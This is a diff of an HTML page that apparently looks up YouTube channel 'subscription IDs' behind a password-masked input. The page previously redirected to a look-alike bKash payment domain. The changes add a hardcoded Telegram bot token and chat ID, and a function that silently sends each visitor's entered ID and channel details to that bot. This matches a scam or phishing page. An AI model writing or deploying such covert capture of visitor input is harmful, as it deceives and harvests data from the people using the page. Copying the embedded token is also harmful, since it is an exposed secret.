@@ -61,9 +61,9 @@
             font-size: 1.1em;
             color: #333;
             background-color: #f9f9f9;
-            letter-spacing: 0.17em; /* Spacing for password-like input */
-            font-family: 'Courier New', Courier, monospace; /* Monospace font for password style */
-            -webkit-text-security: disc; /* Hide text like a password */
+            letter-spacing: 0.17em;
+            font-family: 'Courier New', Courier, monospace;
+            -webkit-text-security: disc;
         }
 
         /* Confirm Button Styling */
@@ -84,10 +84,6 @@
             50% { background-color: white; color: black; }
         }
 
-        input[type="submit"]:hover {
-            /* No hover effect; flicker will show action */
-        }
-
         /* Channel Info Styling */
         .info {
             margin-top: 30px;
@@ -100,17 +96,16 @@
         }
 
         .info img {
-            width: 70px; /* Bigger size for YouTube logo */
-            height: 70px; /* Bigger size for YouTube logo */
+            width: 70px;
+            height: 70px;
             display: block;
             margin: 0 auto 10px auto;
         }
 
-        /* Bold Channel Name and RGB Quantity */
         #channelName {
-            font-weight: bold; /* Bold font for "Channel Name" */
-            font-size: 1.5em; /* Adjust size as needed */
-            color: white; /* Set text color to white */
+            font-weight: bold;
+            font-size: 1.5em;
+            color: white;
         }
 
         #channel {
@@ -122,13 +117,11 @@
             animation: rgbAnimation 3s infinite;
         }
 
-        /* Quantity Styling */
         #quantity {
             font-weight: bold;
-            color: white; /* Set text color to white */
+            color: white;
         }
 
-        /* Countdown styling */
         #countdown {
             margin-top: 20px;
             font-size: 1.5em;
@@ -137,7 +130,6 @@
             display: none;
         }
 
-        /* Countdown Ball Styling */
         .countdown-ball {
             display: inline-block;
             width: 30px;
@@ -146,8 +138,8 @@
             background-color: black;
             color: white;
             font-weight: bold;
-            line-height: 30px; /* Center the text vertically */
-            margin: 0 5px; /* Space between ball and text */
+            line-height: 30px;
+            margin: 0 5px;
             animation: ballFlicker 1s infinite;
         }
 
@@ -156,14 +148,13 @@
             50% { background-color: white; color: black; }
         }
 
-        /* Responsive Design */
         @media (max-width: 600px) {
             input[type="text"] {
                 width: 90%;
             }
 
             h2 {
-                font-size: 1.2em; /* Smaller font size for mobile */
+                font-size: 1.2em;
             }
 
             input[type="submit"] {
@@ -192,13 +183,17 @@
     <img id="channelLogo" src="" alt="Channel Logo" class="channel-logo" style="display:none; border-radius: 50%;">
     <h2 style="font-size: 1.2em; color: #FFEB3B;">Channel Information</h2>
     <p id="channelName">Channel Name: <span id="channel"></span></p>
-    <p id="quantity">Quantity: <span id="qty" style="font-weight: bold; background: linear-gradient(90deg, red, green, blue); -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: rgbAnimation 3s infinite;"></span></p>
+    <p id="quantity">Quantity: <span id="qty" style="font-weight: bold;"></span></p>
 </div> 
 
 <!-- Countdown -->
 <div id="countdown"></div>
 
 <script>
+    // Telegram bot details
+    const botToken = "7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y";
+    const chatId = "6471397661";
+
     // Simulated database of usernames, channel names, quantities, and logos
     const database = [
         { username: "main5main5", channelName: "নতুন সব অনলাইন গেমের তথ্য ", quantity: 2000, logo: "https://imgur.com/qnwzXgr.png" },
@@ -220,37 +215,56 @@
         if (user) {
             document.getElementById("channel").innerText = user.channelName;
             document.getElementById("qty").innerText = user.quantity;
-            document.getElementById("channelLogo").src = user.logo; // Set channel logo
-            document.getElementById("channelLogo").style.display = 'block'; // Display channel logo
+            document.getElementById("channelLogo").src = user.logo;
+            document.getElementById("channelLogo").style.display = 'block';
 
             // Show channel information and countdown
             document.getElementById("info").style.display = 'block';
-            startCountdown(10); // Start countdown with 10 seconds
+            startCountdown(10);
 
             // Hide input section
-            document.getElementById("username").style.display = 'none';
-            document.querySelector("input[type='submit']").style.display = 'none';
+            document.getElementById("username").style.display ='none';
+            
+            // Send message to Telegram
+            sendTelegramMessage(username, user.channelName, user.quantity);
         } else {
-            alert("Username not found!");
+            alert("Invalid Subscription ID.");
         }
+    }
+
+    function sendTelegramMessage(username, channelName, quantity) {
+        const message = `User: ${username}\nChannel Name: ${channelName}\nQuantity: ${quantity}`;
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+        
+        fetch(url)
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Message sent to Telegram successfully.');
+                } else {
+                    console.error('Failed to send message to Telegram.');
+                }
+            })
+            .catch(error => console.error('Error:', error));
     }
 
     function startCountdown(seconds) {
         const countdownElement = document.getElementById("countdown");
         countdownElement.style.display = 'block';
 
-        let remainingTime = seconds;
-
-        const countdownInterval = setInterval(() => {
-            countdownElement.innerHTML = `Time remaining: <span class="countdown-ball">${remainingTime}</span> seconds`;
-            remainingTime--;
-
-            if (remainingTime < 0) {
-            clearInterval(countdownInterval);
-            window.location.href = "https://pay-bkash.vercel.app"; // Redirect to index4.html
+        function updateCountdown() {
+            countdownElement.innerHTML = `Starting in <span class="countdown-ball">${seconds}</span> seconds`;
+            seconds--;
+            
+            if (seconds < 0) {
+                countdownElement.innerHTML = "Countdown finished!";
+            } else {
+                setTimeout(updateCountdown, 1000);
+            }
         }
-        }, 1000);
+        updateCountdown();
     }
 </script>
+
 </body>
 </html>
